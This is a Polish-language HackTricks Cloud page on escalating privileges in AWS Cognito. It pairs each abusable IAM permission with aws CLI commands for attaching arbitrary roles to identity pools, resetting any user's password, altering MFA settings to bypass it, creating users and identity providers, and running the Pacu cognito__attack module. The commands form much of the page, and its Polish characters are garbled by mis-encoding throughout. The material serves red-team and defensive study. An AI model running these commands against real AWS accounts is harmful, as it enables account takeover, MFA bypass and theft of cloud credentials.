# AWS - Eskalacja uprawnie w Cognito

{% hint style="success" %}
Dowiedz si i wicz Hacking AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz si i wicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## Cognito

Aby uzyska wicej informacji na temat Cognito, sprawd藕:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Pozyskiwanie powiadcze z basenu to偶samoci

Poniewa偶 Cognito mo偶e przyzna **powiadczenia roli IAM** zar贸wno **uwierzytelnionym**, jak i **nieuwierzytelnionym** **u偶ytkownikom**, jeli zlokalizujesz **ID basenu to偶samoci** aplikacji (powinno by na niej zakodowane), mo偶esz uzyska nowe powiadczenia i tym samym eskalowa uprawnienia (wewntrz konta AWS, gdzie prawdopodobnie wczeniej nie miae 偶adnych powiadcze).

Aby uzyska wicej informacji, [**sprawd藕 t stron**](../aws-unauthenticated-enum-access/#cognito).

**Potencjalne skutki:** Bezporednia eskalacja uprawnie do roli usug przypisanej do nieuwierzytelnionych u偶ytkownik贸w (i prawdopodobnie do tej przypisanej do uwierzytelnionych u偶ytkownik贸w).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Z tym uprawnieniem mo偶esz **przyzna dowoln rol Cognito** uwierzytelnionym/nieuwierzytelnionym u偶ytkownikom aplikacji Cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Jeli aplikacja Cognito **nie ma wczonych nieuwierzytelnionych u偶ytkownik贸w**, mo偶esz r贸wnie偶 potrzebowa uprawnienia `cognito-identity:UpdateIdentityPool`, aby je wczy.

**Potencjalny wpyw:** Bezporednie podniesienie uprawnie do dowolnej roli Cognito.

### `cognito-identity:update-identity-pool`

Atakujcy posiadajcy to uprawnienie m贸gby na przykad ustawi pul u偶ytkownik贸w Cognito pod swoj kontrol lub dowolnego innego dostawc to偶samoci, gdzie mo偶e zalogowa si jako **spos贸b na dostp do tej puli to偶samoci Cognito**. Nastpnie, po prostu **zalogowanie** si na tym dostawcy u偶ytkownika pozwoli mu **uzyska dostp do skonfigurowanej roli uwierzytelnionej w puli to偶samoci**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Mo偶liwe jest r贸wnie偶 **nadu偶ycie tego uprawnienia w celu umo偶liwienia uwierzytelniania podstawowego**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potencjalny wpyw**: Kompromitacja skonfigurowanej uwierzytelnionej roli IAM w puli to偶samoci.

### `cognito-idp:AdminAddUserToGroup`

To uprawnienie pozwala **doda u偶ytkownika Cognito do grupy Cognito**, dlatego atakujcy m贸gby wykorzysta to uprawnienie, aby doda u偶ytkownika pod swoj kontrol do innych grup z **lepszymi** uprawnieniami lub **r贸偶nymi rolami IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potencjalny wpyw:** Eskalacja uprawnie do innych grup Cognito oraz r贸l IAM przypisanych do grup pul u偶ytkownik贸w.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Atakujcy posiadajcy te uprawnienia m贸gby **tworzy/aktualizowa grupy** z **ka偶d rol IAM, kt贸ra mo偶e by u偶yta przez skompromitowany dostawca to偶samoci Cognito** oraz umieci skompromitowanego u偶ytkownika w grupie, uzyskujc dostp do wszystkich tych r贸l:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potencjalne skutki:** Eskalacja uprawnie do innych r贸l IAM Cognito.

### `cognito-idp:AdminConfirmSignUp`

To uprawnienie umo偶liwia **potwierdzenie rejestracji**. Domylnie ka偶dy mo偶e zarejestrowa si w aplikacjach Cognito, jeli to zostanie, u偶ytkownik mo偶e utworzy konto z dowolnymi danymi i potwierdzi je tym uprawnieniem.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potencjalny wpyw:** Porednie podniesienie uprawnie do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w, jeli mo偶na zarejestrowa nowego u偶ytkownika. Porednie podniesienie uprawnie do innych funkcji aplikacji, umo偶liwiajce potwierdzenie dowolnego konta.

### `cognito-idp:AdminCreateUser`

To uprawnienie umo偶liwioby atakujcemu utworzenie nowego u偶ytkownika w puli u偶ytkownik贸w. Nowy u偶ytkownik jest tworzony jako wczony, ale bdzie musia zmieni swoje haso.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potencjalne skutki:** Bezporednie podniesienie uprawnie do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w. Porednie podniesienie uprawnie do innych funkcji aplikacji, umo偶liwiajc tworzenie dowolnego u偶ytkownika

### `cognito-idp:AdminEnableUser`

Te uprawnienia mog pom贸c w bardzo specyficznym scenariuszu, w kt贸rym atakujcy znalaz powiadczenia wyczonego u偶ytkownika i musi go **ponownie wczy**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potencjalne skutki:** Porednie podniesienie uprawnie do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w oraz uprawnie u偶ytkownika, jeli atakujcy posiada dane uwierzytelniajce wyczonego u偶ytkownika.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

To uprawnienie pozwala na logowanie za pomoc [**metody ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Aby uzyska wicej informacji, przejd藕 pod podany link.

### `cognito-idp:AdminSetUserPassword`

To uprawnienie pozwolioby atakujcemu **zmieni haso dowolnego u偶ytkownika**, umo偶liwiajc mu podszywanie si pod dowolnego u偶ytkownika (kt贸ry nie ma wczonej MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potencjalny wpyw:** Bezporednie podniesienie uprawnie do potencjalnie dowolnego u偶ytkownika, uzyskanie dostpu do wszystkich grup, kt贸rych jest czonkiem, oraz dostp do roli IAM uwierzytelnionej puli to偶samoci.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Atakujcy m贸gby potencjalnie wykorzysta te uprawnienia, aby ustawi sw贸j telefon kom贸rkowy pod kontrol jako **MFA SMS u偶ytkownika**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Podobnie jak w poprzednim przypadku, to uprawnienie mo偶na wykorzysta do ustawienia preferencji MFA u偶ytkownika w celu ominicia ochrony MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Podobnie jak w poprzednim przypadku, to uprawnienie mo偶na wykorzysta do ustawienia preferencji MFA dla puli u偶ytkownik贸w w celu ominicia ochrony MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Istnieje r贸wnie偶 mo偶liwo zaktualizowania puli u偶ytkownik贸w w celu zmiany polityki MFA. [Sprawd藕 tutaj cli](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potencjalny wpyw:** Porednie eskalowanie uprawnie do potencjalnie dowolnego u偶ytkownika, kt贸rych dane uwierzytelniajce zna atakujcy, co mo偶e umo偶liwi ominiecie ochrony MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Atakujcy posiadajcy to uprawnienie m贸gby zmieni e-mail lub numer telefonu lub dowolny inny atrybut u偶ytkownika pod swoj kontrol, aby uzyska wicej uprawnie w aplikacji.\
To pozwala na zmian e-maila lub numeru telefonu i ustawienie go jako zweryfikowany.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potencjalne skutki:** Potencjalne porednie eskalacje uprawnie w aplikacji wykorzystujcej Cognito User Pool, kt贸re nadaj uprawnienia na podstawie atrybut贸w u偶ytkownika.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Atakujcy posiadajcy to uprawnienie m贸gby **utworzy nowego klienta puli u偶ytkownik贸w mniej ograniczonego** ni偶 ju偶 istniejcy klienci puli. Na przykad, nowy klient m贸gby zezwala na dowolny rodzaj uwierzytelniania, nie mie 偶adnego sekretu, wyczy uniewa偶nianie token贸w, zezwoli na wa偶no token贸w przez du偶szy okres...

To samo mo偶na zrobi, jeli zamiast tworzenia nowego klienta, **zmodyfikowany zostanie istniejcy**.

W [**wierszu polece**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (lub [**aktualizacji**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) mo偶na zobaczy wszystkie opcje, sprawd藕 to!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potencjalny wpyw:** Potencjalne porednie eskalowanie uprawnie do u偶ytkownika autoryzowanego puli to偶samoci u偶ywanego przez pul u偶ytkownik贸w poprzez utworzenie nowego klienta, kt贸ry agodzi rodki bezpieczestwa i umo偶liwia atakujcemu zalogowanie si jako u偶ytkownik, kt贸rego by w stanie utworzy.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Atakujcy m贸gby wykorzysta to uprawnienie do tworzenia u偶ytkownik贸w poprzez przesyanie pliku csv z nowymi u偶ytkownikami.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**Potencjalny wpyw:** Bezporednie podniesienie uprawnie do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w. Porednie podniesienie uprawnie do innych funkcji aplikacji, umo偶liwiajc tworzenie dowolnego u偶ytkownika.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Atakujcy m贸gby utworzy nowego dostawc to偶samoci, aby nastpnie **zalogowa si przez tego dostawc**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potencjalny wpyw:** Bezporednie podniesienie uprawnie do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w. Porednie podniesienie uprawnie do innych funkcji aplikacji poprzez mo偶liwo tworzenia dowolnych u偶ytkownik贸w.

### Analiza cognito-sync:\*

To bardzo powszechne uprawnienie domylne w rolach pul to偶samoci Cognito. Nawet jeli u偶ycie gwiazdki w uprawnieniach zawsze wyglda 藕le (szczeg贸lnie pochodzc od AWS), **udzielone uprawnienia nie s super przydatne z perspektywy atakujcego**.

To uprawnienie pozwala na odczyt informacji o u偶ytkownikach pul to偶samoci oraz identyfikatorach to偶samoci wewntrz pul to偶samoci (co nie jest poufnymi informacjami).\
Identyfikatory to偶samoci mog mie przypisane [**Zbiory danych**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html), kt贸re s informacjami o sesjach (AWS definiuje to jako **zapisan gr**). Mo偶liwe, 偶e mog one zawiera pewne poufne informacje (ale prawdopodobiestwo jest do niskie). Mo偶esz znale藕 na [**stronie wyliczania**](../aws-services/aws-cognito-enum/) spos贸b dostpu do tych informacji.

Atakujcy m贸gby r贸wnie偶 u偶y tych uprawnie do **zapisania si do strumienia Cognito, kt贸ry publikuje zmiany** w tych zbiorach danych lub **funkcji lambda, kt贸ra wyzwalana jest przez zdarzenia Cognito**. Nie widziaem, aby to byo wykorzystywane, i nie spodziewabym si tutaj poufnych informacji, ale nie jest to niemo偶liwe.

### Automatyczne narzdzia

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), framework eksploatacji AWS, teraz zawiera moduy "cognito\_\_enum" i "cognito\_\_attack", kt贸re automatyzuj wyliczanie wszystkich zasob贸w Cognito w koncie i oznaczaj sabe konfiguracje, atrybuty u偶ytkownika u偶ywane do kontroli dostpu, itp., oraz automatyzuj tworzenie u偶ytkownik贸w (w tym obsug MFA) i eskalacj uprawnie na podstawie modyfikowalpu niestandardowych atrybut贸w, u偶ytecznych powiadcze puli to偶samoci, r贸l do przyjcia w tokenach id, itp.

Aby zapozna si z opisem funkcji modu贸w, zobacz cz 2 [postu na blogu](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Instrukcje instalacji znajdziesz na g贸wnej stronie [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### U偶ycie

Przykadowe u偶ycie cognito\_\_attack do pr贸by tworzenia u偶ytkownika i wszystkich wektor贸w podwy偶szenia uprawnie przeciwko okrelonej puli to偶samoci i klientowi puli u偶ytkownik贸w:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Przykadowe u偶ycie cognito\_\_enum do zebrania wszystkich pul u偶ytkownik贸w, klient贸w pul u偶ytkownik贸w, pul to偶samoci, u偶ytkownik贸w itp. widocznych w bie偶cym koncie AWS:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) to narzdzie CLI napisane w jzyku Python, kt贸re implementuje r贸偶ne ataki na Cognito, w tym eskalacj uprawnie.

#### Instalacja
```bash
$ pip install cognito-scanner
```
#### U偶ycie
```bash
$ cognito-scanner --help
```
Dla dalszych informacji sprawd藕 [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Dowiedz si i praktykuj Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz si i praktykuj Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostpnij sztuczki hakerskie, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
